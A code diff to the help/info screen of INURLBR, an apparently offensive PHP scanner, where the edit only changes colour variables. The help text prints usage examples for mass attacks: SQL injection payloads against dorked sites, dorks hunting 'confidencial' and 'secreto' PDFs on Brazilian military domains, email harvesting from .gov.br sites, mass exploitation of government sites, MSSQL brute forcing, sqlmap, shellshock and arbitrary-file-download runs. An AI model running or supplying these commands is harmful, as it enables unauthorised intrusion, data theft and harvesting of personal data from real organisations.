@@ -1,9 +1,9 @@
 <?php
 
 function __info() {
-
+   $cor = $GLOBALS['COR'];
     return __getOut("
- {$_SESSION["c1"]}
+ {$cor->whit}
    ██▓    ███▄    █      █████▒    ▒█████  
    ▓██▒    ██ ▀█   █    ▓██   ▒    ▒██▒  ██▒
    ▒██▒   ▓██  ▀█ ██▒   ▒████ ░    ▒██░  ██▒
@@ -15,124 +15,119 @@ function __info() {
    ░              ░                   ░ ░  
 
    
-{$_SESSION["c1"]}[  +  ] {$_SESSION["c0"]}SCRIPT NAME: INURLBR {$_SESSION['config']['version_script']}
-{$_SESSION["c1"]}[  +  ] {$_SESSION["c0"]}AUTOR:    Cleiton Pinheiro
-{$_SESSION["c1"]}[  +  ] {$_SESSION["c0"]}Nick:     MrCl0wnLab
-{$_SESSION["c1"]}[  +  ] {$_SESSION["c0"]}Email:    mrcl0wnlab\@\gmail.com 
-{$_SESSION["c1"]}[  +  ] {$_SESSION["c0"]}Blog:     blog.mrcl0wn.com
-{$_SESSION["c1"]}[  +  ] {$_SESSION["c0"]}Twitter:  twitter.com/MrCl0wnLab
-{$_SESSION["c1"]}[  +  ] {$_SESSION["c0"]}GIT:      github.com/MrCl0wnLab
-{$_SESSION["c1"]}[  +  ] {$_SESSION["c0"]}PSS:      packetstormsecurity.com/user/mrcl0wnlab
-{$_SESSION["c1"]}[  +  ] {$_SESSION["c0"]}Version:  {$_SESSION['config']['version_script']} 
-{$_SESSION["c1"]}------------------------------------------------------------------------------------------------------------{$_SESSION["c0"]}
+{$cor->whit}[ INF ] {$cor->end}SCRIPT NAME: INURLBR {$_SESSION['config']['version_script']}
+{$cor->whit}[ INF ] {$cor->end}AUTOR:    Cleiton Pinheiro
+{$cor->whit}[ INF ] {$cor->end}Nick:     MrCl0wnLab
+{$cor->whit}[ INF ] {$cor->end}Email:    mrcl0wnlab\@\gmail.com 
+{$cor->whit}[ INF ] {$cor->end}Blog:     blog.mrcl0wn.com
+{$cor->whit}[ INF ] {$cor->end}Twitter:  twitter.com/MrCl0wnLab
+{$cor->whit}[ INF ] {$cor->end}GIT:      github.com/MrCl0wnLab
+{$cor->whit}[ INF ] {$cor->end}PSS:      packetstormsecurity.com/user/mrcl0wnlab
+{$cor->whit}[ INF ] {$cor->end}Version:  {$_SESSION['config']['version_script']} 
+{$cor->whit}------------------------------------------------------------------------------------------------------------{$cor->end}
     
 
-{$_SESSION["c1"]}[ INF ]{$_SESSION["c0"]}Current PHP version=>{$_SESSION["c1"]}[ " . phpversion() . "{$_SESSION["c0"]} ]
-{$_SESSION["c1"]}[ INF ]{$_SESSION["c0"]}Current script owner=>{$_SESSION["c1"]}[ " . get_current_user() . "{$_SESSION["c0"]} ]
-{$_SESSION["c1"]}[ INF ]{$_SESSION["c0"]}Current uname=>{$_SESSION["c1"]}[ " . php_uname() . "{$_SESSION["c0"]} ]
-{$_SESSION["c1"]}[ INF ]{$_SESSION["c0"]}Current pwd=>{$_SESSION["c1"]}[ " . getcwd() . "{$_SESSION["c0"]} ]
-{$_SESSION["c1"]}------------------------------------------------------------------------------------------------------------{$_SESSION["c0"]}
+{$cor->whit}[ INF ] {$cor->end}Current PHP version=>{$cor->whit}[ " . phpversion() . "{$cor->end} ]
+{$cor->whit}[ INF ] {$cor->end}Current script owner=>{$cor->whit}[ " . get_current_user() . "{$cor->end} ]
+{$cor->whit}[ INF ] {$cor->end}Current uname=>{$cor->whit}[ " . php_uname() . "{$cor->end} ]
+{$cor->whit}[ INF ] {$cor->end}Current pwd=>{$cor->whit}[ " . getcwd() . "{$cor->end} ]
+{$cor->whit}------------------------------------------------------------------------------------------------------------{$cor->end}
  
-
-{$_SESSION["c1"]}[ INF ]{$_SESSION["c16"]} NECESSARY FOR THE PROPER FUNCTIONING OF THE SCRIPT{$_SESSION["c0"]}
-{$_SESSION["c1"]}[ INF ]{$_SESSION["c16"]} LIB & CONFIG{$_SESSION["c0"]}
-
-{$_SESSION["c1"]}[ INF ]{$_SESSION["c0"]} PHP Version         8.3.11
-{$_SESSION["c1"]}[ INF ]{$_SESSION["c0"]} php7-curl           LIB
-{$_SESSION["c1"]}[ INF ]{$_SESSION["c0"]} php7-cli            LIB   
-{$_SESSION["c1"]}[ INF ]{$_SESSION["c0"]} cURL support        enabled
-{$_SESSION["c1"]}[ INF ]{$_SESSION["c0"]} allow_url_fopen     On
-{$_SESSION["c1"]}[ INF ]{$_SESSION["c0"]} permission          Reading & Writing
-{$_SESSION["c1"]}[ INF ]{$_SESSION["c0"]} User                root privilege, or is in the sudoers group
-{$_SESSION["c1"]}[ INF ]{$_SESSION["c0"]} Operating system    LINUX
-{$_SESSION["c1"]}[ INF ]{$_SESSION["c0"]} Proxy random        TOR 
-                
-{$_SESSION["c1"]}------------------------------------------------------------------------------------------------------------{$_SESSION["c0"]}
+{$cor->whit}[ INF ] {$cor->red2} NECESSARY FOR THE PROPER FUNCTIONING OF THE SCRIPT{$cor->end}
+{$cor->whit}[ INF ] {$cor->red2} LIB & CONFIG{$cor->end}
+{$cor->whit}[ INF ] {$cor->end} PHP Version         8.3.11
+{$cor->whit}[ INF ] {$cor->end} php7-curl           LIB
+{$cor->whit}[ INF ] {$cor->end} php7-cli            LIB   
+{$cor->whit}[ INF ] {$cor->end} cURL support        enabled
+{$cor->whit}[ INF ] {$cor->end} allow_url_fopen     On
+{$cor->whit}[ INF ] {$cor->end} permission          Reading & Writing
+{$cor->whit}[ INF ] {$cor->end} User                root privilege, or is in the sudoers group
+{$cor->whit}[ INF ] {$cor->end} Operating system    LINUX
+{$cor->whit}[ INF ] {$cor->end} Proxy random        TOR    
+{$cor->whit}------------------------------------------------------------------------------------------------------------{$cor->end}
  
-{$_SESSION["c1"]}[ INF ] {$_SESSION["c0"]} {$_SESSION["c16"]}PERMISSION EXECUTION: chmod +x inurlbr{$_SESSION["c0"]}
-{$_SESSION["c1"]}[ INF ] {$_SESSION["c0"]} {$_SESSION["c16"]}INSTALLING LIB PHP-CURL: sudo apt-get install php8-curl{$_SESSION["c0"]}
-{$_SESSION["c1"]}[ INF ] {$_SESSION["c0"]} {$_SESSION["c16"]}INSTALLING LIB PHP-CLI: sudo apt-get install php8-cli{$_SESSION["c0"]}
-{$_SESSION["c1"]}[ INF ] {$_SESSION["c0"]} {$_SESSION["c16"]}sudo apt-get install curl libcurl3 libcurl3-dev php8 php8-cli php8-curl{$_SESSION["c0"]}
-{$_SESSION["c1"]}[ INF ] {$_SESSION["c0"]} {$_SESSION["c16"]}INSTALLING PROXY TOR https://www.torproject.org/docs/debian.html.en{$_SESSION["c0"]}
-{$_SESSION["c1"]}------------------------------------------------------------------------------------------------------------{$_SESSION["c0"]}
+{$cor->whit}[ INF ] {$cor->end} {$cor->red2}PERMISSION EXECUTION: chmod +x inurlbr{$cor->end}
+{$cor->whit}[ INF ] {$cor->end} {$cor->red2}INSTALLING LIB PHP-CURL: sudo apt-get install php8-curl{$cor->end}
+{$cor->whit}[ INF ] {$cor->end} {$cor->red2}INSTALLING LIB PHP-CLI: sudo apt-get install php8-cli{$cor->end}
+{$cor->whit}[ INF ] {$cor->end} {$cor->red2}sudo apt-get install curl libcurl3 libcurl3-dev php8 php8-cli php8-curl{$cor->end}
+{$cor->whit}[ INF ] {$cor->end} {$cor->red2}INSTALLING PROXY TOR https://www.torproject.org/docs/debian.html.en{$cor->end}
+{$cor->whit}------------------------------------------------------------------------------------------------------------{$cor->end}
 
-{$_SESSION["c1"]}[ INF ] {$_SESSION["c16"]} COMMANDS SIMPLE SCRIPT{$_SESSION["c0"]}
+{$cor->whit}[ INF ] {$cor->red2} COMMANDS SIMPLE SCRIPT{$cor->end}
 
-inurlbr {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'inurl:php?id=' {$_SESSION["c1"]}-s {$_SESSION["c2"]}save.txt {$_SESSION["c1"]}-q 1,6 {$_SESSION["c1"]}-t {$_SESSION["c2"]}1 {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}\"?´'%270x27;\" {$_SESSION["c0"]} 
+inurlbr {$cor->whit}--dork {$cor->yell}'inurl:php?id=' {$cor->whit}-s {$cor->yell}save.txt {$cor->whit}-q 1,6 {$cor->whit}-t {$cor->yell}1 {$cor->whit}--exploit-get {$cor->red1}\"?´'%270x27;\" {$cor->end} 
    
-inurlbr {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'inurl:aspx?id=' {$_SESSION["c1"]}-s {$_SESSION["c2"]}save.txt {$_SESSION["c1"]}-q 1,6 {$_SESSION["c1"]}-t {$_SESSION["c2"]}1 {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}\"?´'%270x27;\" {$_SESSION["c0"]}
+inurlbr {$cor->whit}--dork {$cor->yell}'inurl:aspx?id=' {$cor->whit}-s {$cor->yell}save.txt {$cor->whit}-q 1,6 {$cor->whit}-t {$cor->yell}1 {$cor->whit}--exploit-get {$cor->red1}\"?´'%270x27;\" {$cor->end}
    
-inurlbr {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:br inurl:aspx (id|new)' {$_SESSION["c1"]}-s {$_SESSION["c2"]}save.txt {$_SESSION["c1"]}-q {$_SESSION["c2"]}1,6 {$_SESSION["c1"]}-t {$_SESSION["c2"]}1 {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}\"?´'%270x27;\"{$_SESSION["c0"]}
+inurlbr {$cor->whit}--dork {$cor->yell}'site:br inurl:aspx (id|new)' {$cor->whit}-s {$cor->yell}save.txt {$cor->whit}-q {$cor->yell}1,6 {$cor->whit}-t {$cor->yell}1 {$cor->whit}--exploit-get {$cor->red1}\"?´'%270x27;\"{$cor->end}
    
-inurlbr {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'index of wp-content/uploads' {$_SESSION["c1"]}-s {$_SESSION["c2"]}save.txt {$_SESSION["c1"]}-q {$_SESSION["c2"]}1,6,2,4 {$_SESSION["c1"]}-t {$_SESSION["c2"]}2 {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}'?' {$_SESSION["c1"]}-a {$_SESSION["c2"]}'Index of /wp-content/uploads'{$_SESSION["c0"]}
+inurlbr {$cor->whit}--dork {$cor->yell}'index of wp-content/uploads' {$cor->whit}-s {$cor->yell}save.txt {$cor->whit}-q {$cor->yell}1,6,2,4 {$cor->whit}-t {$cor->yell}2 {$cor->whit}--exploit-get {$cor->red1}'?' {$cor->whit}-a {$cor->yell}'Index of /wp-content/uploads'{$cor->end}
    
-inurlbr {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:.mil.br intext:(confidencial) ext:pdf' {$_SESSION["c1"]}-s {$_SESSION["c2"]}save.txt {$_SESSION["c1"]}-q 1,6 -t 2 --exploit-get {$_SESSION["c3"]}'?' {$_SESSION["c1"]}-a {$_SESSION["c2"]}'confidencial'{$_SESSION["c0"]}
+inurlbr {$cor->whit}--dork {$cor->yell}'site:.mil.br intext:(confidencial) ext:pdf' {$cor->whit}-s {$cor->yell}save.txt {$cor->whit}-q 1,6 -t 2 --exploit-get {$cor->red1}'?' {$cor->whit}-a {$cor->yell}'confidencial'{$cor->end}
    
-inurlbr {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:.mil.br intext:(secreto) ext:pdf' {$_SESSION["c1"]}-s save.txt {$_SESSION["c1"]}-q {$_SESSION["c2"]}1,6 {$_SESSION["c1"]}-t {$_SESSION["c2"]}2 {$_SESSION["c1"]}--exploit-get {$_SESSION["c2"]}'?' {$_SESSION["c1"]}-a {$_SESSION["c2"]}'secreto'{$_SESSION["c0"]}        
+inurlbr {$cor->whit}--dork {$cor->yell}'site:.mil.br intext:(secreto) ext:pdf' {$cor->whit}-s save.txt {$cor->whit}-q {$cor->yell}1,6 {$cor->whit}-t {$cor->yell}2 {$cor->whit}--exploit-get {$cor->yell}'?' {$cor->whit}-a {$cor->yell}'secreto'{$cor->end}        
   
-inurlbr {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:br inurl:aspx (id|new)' {$_SESSION["c1"]}-s {$_SESSION["c2"]}save.txt {$_SESSION["c1"]}-q {$_SESSION["c2"]}1,6 {$_SESSION["c1"]}-t {$_SESSION["c2"]}1 {$_SESSION["c1"]}--exploit-get {$_SESSION["c2"]}\"?´'%270x27;\"{$_SESSION["c0"]}
+inurlbr {$cor->whit}--dork {$cor->yell}'site:br inurl:aspx (id|new)' {$cor->whit}-s {$cor->yell}save.txt {$cor->whit}-q {$cor->yell}1,6 {$cor->whit}-t {$cor->yell}1 {$cor->whit}--exploit-get {$cor->yell}\"?´'%270x27;\"{$cor->end}
    
-inurlbr {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'.new.php?new id' {$_SESSION["c1"]}-s {$_SESSION["c2"]}save.txt {$_SESSION["c1"]}-q 1,6,7,2,3 {$_SESSION["c1"]}-t {$_SESSION["c2"]}1 {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}'+UNION+ALL+SELECT+1,concat(0x3A3A4558504C4F49542D5355434553533A3A,@@version),3,4,5;' {$_SESSION["c1"]}-a {$_SESSION["c2"]}'::EXPLOIT-SUCESS::'{$_SESSION["c0"]}
+inurlbr {$cor->whit}--dork {$cor->yell}'.new.php?new id' {$cor->whit}-s {$cor->yell}save.txt {$cor->whit}-q 1,6,7,2,3 {$cor->whit}-t {$cor->yell}1 {$cor->whit}--exploit-get {$cor->red1}'+UNION+ALL+SELECT+1,concat(0x3A3A4558504C4F49542D5355434553533A3A,@@version),3,4,5;' {$cor->whit}-a {$cor->yell}'::EXPLOIT-SUCESS::'{$cor->end}
   
-inurlbr {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'new.php?id=' {$_SESSION["c1"]}-s {$_SESSION["c2"]}teste.txt  {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}?´0x27  {$_SESSION["c1"]}--command-vul {$_SESSION["c2"]}'nmap sV -p 22,80,21 {$_SESSION["c8"]}_TARGET_{$_SESSION["c2"]}'{$_SESSION["c0"]}
+inurlbr {$cor->whit}--dork {$cor->yell}'new.php?id=' {$cor->whit}-s {$cor->yell}teste.txt  {$cor->whit}--exploit-get {$cor->red1}?´0x27  {$cor->whit}--command-vul {$cor->yell}'nmap sV -p 22,80,21 {$cor->blue}_TARGET_{$cor->yell}'{$cor->end}
    
-inurlbr {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:pt inurl:aspx (id|q)' {$_SESSION["c1"]}-s {$_SESSION["c2"]}bruteforce.txt {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}?´0x27 {$_SESSION["c1"]}--command-vul {$_SESSION["c2"]}'msfcli auxiliary/scanner/mssql/mssql_login RHOST={$_SESSION["c9"]}_TARGETIP_ {$_SESSION["c2"]}MSSQL_USER=inurlbr MSSQL_PASS_FILE=/home/pedr0/Documentos/passwords E'{$_SESSION["c0"]}
+inurlbr {$cor->whit}--dork {$cor->yell}'site:pt inurl:aspx (id|q)' {$cor->whit}-s {$cor->yell}bruteforce.txt {$cor->whit}--exploit-get {$cor->red1}?´0x27 {$cor->whit}--command-vul {$cor->yell}'msfcli auxiliary/scanner/mssql/mssql_login RHOST={$cor->grey1}_TARGETIP_ {$cor->yell}MSSQL_USER=inurlbr MSSQL_PASS_FILE=/home/pedr0/Documentos/passwords E'{$cor->end}
   
-inurlbr {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:br inurl:id & inurl:php' {$_SESSION["c1"]}-s {$_SESSION["c2"]}get.txt {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}\"?´'%270x27;\" {$_SESSION["c1"]}--command-vul {$_SESSION["c2"]}'python ../sqlmap/sqlmap.py -u \"{$_SESSION["c14"]}_TARGETFULL_{$_SESSION["c2"]}\" --dbs'{$_SESSION["c0"]}
+inurlbr {$cor->whit}--dork {$cor->yell}'site:br inurl:id & inurl:php' {$cor->whit}-s {$cor->yell}get.txt {$cor->whit}--exploit-get {$cor->red1}\"?´'%270x27;\" {$cor->whit}--command-vul {$cor->yell}'python ../sqlmap/sqlmap.py -u \"{$cor->cya}_TARGETFULL_{$cor->yell}\" --dbs'{$cor->end}
   
-inurlbr {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'inurl:index.php?id=' {$_SESSION["c1"]}-q 1,2,10 {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}\"'?´0x27'\" {$_SESSION["c1"]}-s {$_SESSION["c2"]}report.txt {$_SESSION["c1"]}--command-vul {$_SESSION["c2"]}'nmap -Pn -p 1-8080 --script http-enum --open {$_SESSION["c8"]}_TARGET_{$_SESSION["c2"]}'{$_SESSION["c0"]}
+inurlbr {$cor->whit}--dork {$cor->yell}'inurl:index.php?id=' {$cor->whit}-q 1,2,10 {$cor->whit}--exploit-get {$cor->red1}\"'?´0x27'\" {$cor->whit}-s {$cor->yell}report.txt {$cor->whit}--command-vul {$cor->yell}'nmap -Pn -p 1-8080 --script http-enum --open {$cor->blue}_TARGET_{$cor->yell}'{$cor->end}
  
-inurlbr {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:.gov.br email' {$_SESSION["c1"]}-s {$_SESSION["c2"]}reg.txt -q 1  --regexp '([\w\d\.\-\_]+)@([\w\d\.\_\-]+)'{$_SESSION["c0"]}
+inurlbr {$cor->whit}--dork {$cor->yell}'site:.gov.br email' {$cor->whit}-s {$cor->yell}reg.txt -q 1  --regexp '([\w\d\.\-\_]+)@([\w\d\.\_\-]+)'{$cor->end}
   
-inurlbr {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:.gov.br email (gmail|yahoo|hotmail) ext:txt' {$_SESSION["c1"]}-s {$_SESSION["c2"]}emails.txt {$_SESSION["c1"]}-m{$_SESSION["c0"]}
+inurlbr {$cor->whit}--dork {$cor->yell}'site:.gov.br email (gmail|yahoo|hotmail) ext:txt' {$cor->whit}-s {$cor->yell}emails.txt {$cor->whit}-m{$cor->end}
   
-inurlbr {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:.gov.br email (gmail|yahoo|hotmail) ext:txt' {$_SESSION["c1"]}-s {$_SESSION["c2"]}urls.txt {$_SESSION["c1"]}-u{$_SESSION["c0"]}
+inurlbr {$cor->whit}--dork {$cor->yell}'site:.gov.br email (gmail|yahoo|hotmail) ext:txt' {$cor->whit}-s {$cor->yell}urls.txt {$cor->whit}-u{$cor->end}
 
-inurlbr {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:gov.br' {$_SESSION["c1"]}-s {$_SESSION["c2"]}urls.txt {$_SESSION["c1"]}--ua{$_SESSION["c0"]}
+inurlbr {$cor->whit}--dork {$cor->yell}'site:gov.br' {$cor->whit}-s {$cor->yell}urls.txt {$cor->whit}--ua{$cor->end}
 
-inurlbr {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:gov.bo' {$_SESSION["c1"]}-s {$_SESSION["c2"]}govs.txt {$_SESSION["c1"]}--exploit-all-id {$_SESSION["c2"]} 1,2,6 {$_SESSION["c0"]} 
+inurlbr {$cor->whit}--dork {$cor->yell}'site:gov.bo' {$cor->whit}-s {$cor->yell}govs.txt {$cor->whit}--exploit-all-id {$cor->yell} 1,2,6 {$cor->end} 
  
-inurlbr {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:.uk' {$_SESSION["c1"]}-s {$_SESSION["c2"]}uk.txt {$_SESSION["c1"]}--user-agent {$_SESSION["c2"]} 'Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)' {$_SESSION["c0"]}
+inurlbr {$cor->whit}--dork {$cor->yell}'site:.uk' {$cor->whit}-s {$cor->yell}uk.txt {$cor->whit}--user-agent {$cor->yell} 'Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)' {$cor->end}
  
-inurlbr {$_SESSION["c1"]}--dork-file {$_SESSION["c2"]}'dorksSqli.txt' {$_SESSION["c1"]}-s {$_SESSION["c2"]}govs.txt {$_SESSION["c1"]}--exploit-all-id {$_SESSION["c2"]} 1,2,6 {$_SESSION["c0"]}
+inurlbr {$cor->whit}--dork-file {$cor->yell}'dorksSqli.txt' {$cor->whit}-s {$cor->yell}govs.txt {$cor->whit}--exploit-all-id {$cor->yell} 1,2,6 {$cor->end}
  
-inurlbr {$_SESSION["c1"]}--dork-file {$_SESSION["c2"]}'dorksSqli.txt' {$_SESSION["c1"]}-s {$_SESSION["c2"]}sqli.txt {$_SESSION["c1"]}--exploit-all-id {$_SESSION["c2"]} 1,2,6  {$_SESSION["c1"]}--irc {$_SESSION["c2"]}'irc.rizon.net#inurlbrasil'   {$_SESSION["c0"]}
+inurlbr {$cor->whit}--dork-file {$cor->yell}'dorksSqli.txt' {$cor->whit}-s {$cor->yell}sqli.txt {$cor->whit}--exploit-all-id {$cor->yell} 1,2,6  {$cor->whit}--irc {$cor->yell}'irc.rizon.net#inurlbrasil'   {$cor->end}
   
-inurlbr {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'inurl:\"cgi-bin/login.cgi\"' {$_SESSION["c1"]}-s {$_SESSION["c2"]}cgi.txt --ifurl 'cgi' --command-all 'php xplCGI.php _TARGET_' {$_SESSION["c0"]} 
+inurlbr {$cor->whit}--dork {$cor->yell}'inurl:\"cgi-bin/login.cgi\"' {$cor->whit}-s {$cor->yell}cgi.txt --ifurl 'cgi' --command-all 'php xplCGI.php _TARGET_' {$cor->end} 
  
-inurlbr {$_SESSION["c1"]}--target {$_SESSION["c2"]}'http://target.com.br' {$_SESSION["c1"]}-o {$_SESSION["c2"]}cancat_file_urls_find.txt {$_SESSION["c1"]}-s {$_SESSION["c2"]}output.txt {$_SESSION["c1"]}-t {$_SESSION["c2"]}4{$_SESSION["c0"]}
+inurlbr {$cor->whit}--target {$cor->yell}'http://target.com.br' {$cor->whit}-o {$cor->yell}cancat_file_urls_find.txt {$cor->whit}-s {$cor->yell}output.txt {$cor->whit}-t {$cor->yell}4{$cor->end}
   
-inurlbr {$_SESSION["c1"]}--target {$_SESSION["c2"]}'http://target.com.br' {$_SESSION["c1"]}-o {$_SESSION["c2"]}cancat_file_urls_find.txt {$_SESSION["c1"]}-s {$_SESSION["c2"]}output.txt {$_SESSION["c1"]}-t {$_SESSION["c2"]}4{$_SESSION["c0"]} {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}\"?´'%270x27;\"{$_SESSION["c0"]}
+inurlbr {$cor->whit}--target {$cor->yell}'http://target.com.br' {$cor->whit}-o {$cor->yell}cancat_file_urls_find.txt {$cor->whit}-s {$cor->yell}output.txt {$cor->whit}-t {$cor->yell}4{$cor->end} {$cor->whit}--exploit-get {$cor->red1}\"?´'%270x27;\"{$cor->end}
   
-inurlbr {$_SESSION["c1"]}--target {$_SESSION["c2"]}'http://target.com.br' {$_SESSION["c1"]}-o {$_SESSION["c2"]}cancat_file_urls_find.txt {$_SESSION["c1"]}-s {$_SESSION["c2"]}output.txt {$_SESSION["c1"]}-t {$_SESSION["c2"]}4{$_SESSION["c0"]} {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}\"?pass=1234\" {$_SESSION["c1"]}-a {$_SESSION["c2"]}'<title>hello! admin</title>'{$_SESSION["c0"]}
+inurlbr {$cor->whit}--target {$cor->yell}'http://target.com.br' {$cor->whit}-o {$cor->yell}cancat_file_urls_find.txt {$cor->whit}-s {$cor->yell}output.txt {$cor->whit}-t {$cor->yell}4{$cor->end} {$cor->whit}--exploit-get {$cor->red1}\"?pass=1234\" {$cor->whit}-a {$cor->yell}'<title>hello! admin</title>'{$cor->end}
   
-inurlbr {$_SESSION["c1"]}--target {$_SESSION["c2"]}'http://target.com.br' {$_SESSION["c1"]}-o {$_SESSION["c2"]}cancat_file_urls_find_valid_cod-200.txt {$_SESSION["c1"]}-s {$_SESSION["c2"]}output.txt {$_SESSION["c1"]}-t {$_SESSION["c2"]}5{$_SESSION["c0"]}
+inurlbr {$cor->whit}--target {$cor->yell}'http://target.com.br' {$cor->whit}-o {$cor->yell}cancat_file_urls_find_valid_cod-200.txt {$cor->whit}-s {$cor->yell}output.txt {$cor->whit}-t {$cor->yell}5{$cor->end}
   
-inurlbr {$_SESSION["c1"]}--range {$_SESSION["c2"]}'200.20.10.1,200.20.10.255' {$_SESSION["c1"]}-s {$_SESSION["c2"]}output.txt {$_SESSION["c1"]}--command-all {$_SESSION["c2"]}'php roteador.php _TARGETIP_'  {$_SESSION["c0"]}
+inurlbr {$cor->whit}--range {$cor->yell}'200.20.10.1,200.20.10.255' {$cor->whit}-s {$cor->yell}output.txt {$cor->whit}--command-all {$cor->yell}'php roteador.php _TARGETIP_'  {$cor->end}
  
-inurlbr {$_SESSION["c1"]}--range-rad {$_SESSION["c2"]}'1500' {$_SESSION["c1"]}-s {$_SESSION["c2"]}output.txt {$_SESSION["c1"]}--command-all {$_SESSION["c2"]}'php roteador.php _TARGETIP_'  {$_SESSION["c0"]}
+inurlbr {$cor->whit}--range-rad {$cor->yell}'1500' {$cor->whit}-s {$cor->yell}output.txt {$cor->whit}--command-all {$cor->yell}'php roteador.php _TARGETIP_'  {$cor->end}
  
-inurlbr {$_SESSION["c1"]}--dork-rad {$_SESSION["c2"]}'20' {$_SESSION["c1"]}-s {$_SESSION["c2"]}output.txt {$_SESSION["c1"]}--exploit-get {$_SESSION["c2"]}\"?´'%270x27;\" {$_SESSION["c1"]}-q {$_SESSION["c2"]}1,2,6,4,5,9,7,8  {$_SESSION["c0"]}
+inurlbr {$cor->whit}--dork-rad {$cor->yell}'20' {$cor->whit}-s {$cor->yell}output.txt {$cor->whit}--exploit-get {$cor->yell}\"?´'%270x27;\" {$cor->whit}-q {$cor->yell}1,2,6,4,5,9,7,8  {$cor->end}
  
-inurlbr {$_SESSION["c1"]}--dork-rad {$_SESSION["c2"]}'20' {$_SESSION["c1"]}-s {$_SESSION["c2"]}output.txt {$_SESSION["c1"]}--exploit-get {$_SESSION["c2"]}\"?´'%270x27;\" {$_SESSION["c1"]}-q {$_SESSION["c2"]}1,2,6,4,5,9,7,8  {$_SESSION["c0"]} {$_SESSION["c1"]}--pr{$_SESSION["c0"]}
+inurlbr {$cor->whit}--dork-rad {$cor->yell}'20' {$cor->whit}-s {$cor->yell}output.txt {$cor->whit}--exploit-get {$cor->yell}\"?´'%270x27;\" {$cor->whit}-q {$cor->yell}1,2,6,4,5,9,7,8  {$cor->end} {$cor->whit}--pr{$cor->end}
  
-inurlbr {$_SESSION["c1"]}--dork-file {$_SESSION["c2"]}'dorksCGI.txt' {$_SESSION["c1"]}-s {$_SESSION["c2"]}output.txt {$_SESSION["c1"]}-q {$_SESSION["c2"]}1,2,6,4,5,9,7,8  {$_SESSION["c0"]}{$_SESSION["c1"]} --pr --shellshock{$_SESSION["c0"]}
+inurlbr {$cor->whit}--dork-file {$cor->yell}'dorksCGI.txt' {$cor->whit}-s {$cor->yell}output.txt {$cor->whit}-q {$cor->yell}1,2,6,4,5,9,7,8  {$cor->end}{$cor->whit} --pr --shellshock{$cor->end}
  
-inurlbr {$_SESSION["c1"]}--dork-file {$_SESSION["c2"]}'dorks_Wordpress_revslider.txt' {$_SESSION["c1"]}-s {$_SESSION["c2"]}output.txt {$_SESSION["c1"]}-q {$_SESSION["c2"]}1,2,6,4,5,9,7,8  {$_SESSION["c1"]}--sub-file {$_SESSION["c2"]}'xpls_Arbitrary_File_Download.txt' {$_SESSION["c0"]}
+inurlbr {$cor->whit}--dork-file {$cor->yell}'dorks_Wordpress_revslider.txt' {$cor->whit}-s {$cor->yell}output.txt {$cor->whit}-q {$cor->yell}1,2,6,4,5,9,7,8  {$cor->whit}--sub-file {$cor->yell}'xpls_Arbitrary_File_Download.txt' {$cor->end}
+{$cor->whit}------------------------------------------------------------------------------------------------------------{$cor->end}
+  
+{$cor->whit}[ INF ]{$cor->red2} It it also useful to know the full path to the PHP binary on your computer. {$cor->end}
+{$cor->whit}[ INF ]{$cor->red2} There are several ways of finding out. For Ubuntu and Mac OS X the path is '/usr/bin/php'.{$cor->end}
 
-
-{$_SESSION["c1"]}------------------------------------------------------------------------------------------------------------{$_SESSION["c0"]}
-  
-{$_SESSION["c1"]}[ INF ]{$_SESSION["c16"]} It it also useful to know the full path to the PHP binary on your computer. {$_SESSION["c0"]}
-{$_SESSION["c1"]}[ INF ]{$_SESSION["c16"]} There are several ways of finding out. For Ubuntu and Mac OS X the path is '/usr/bin/php'.{$_SESSION["c0"]}
-
-{$_SESSION["c1"]}[ INF ]{$_SESSION["c16"]} googleinurl@inurlbr:~$ which php 
-         /usr/bin/php{$_SESSION["c0"]} 
-{$_SESSION["c1"]}[ INF ]{$_SESSION["c16"]} googleinurl@inurlbr:~/cli$ whereis php
-         php: /usr/bin/php /usr/share/php /usr/share/man/man1/php.1.gz{$_SESSION["c0"]} 
-{$_SESSION["c1"]}[ INF ]{$_SESSION["c16"]} googleinurl@inurlbr:~/cli$ type -a php 
-         php is /usr/bin/php{$_SESSION["c0"]}
-{$_SESSION["c1"]}------------------------------------------------------------------------------------------------------------{$_SESSION["c0"]}
+{$cor->whit}[ INF ]{$cor->red2} googleinurl@inurlbr:~$ which php 
+         /usr/bin/php{$cor->end} 
+{$cor->whit}[ INF ]{$cor->red2} googleinurl@inurlbr:~/cli$ whereis php
+         php: /usr/bin/php /usr/share/php /usr/share/man/man1/php.1.gz{$cor->end} 
+{$cor->whit}[ INF ]{$cor->red2} googleinurl@inurlbr:~/cli$ type -a php 
+         php is /usr/bin/php{$cor->end}
+{$cor->whit}------------------------------------------------------------------------------------------------------------{$cor->end}
 
 
 ");
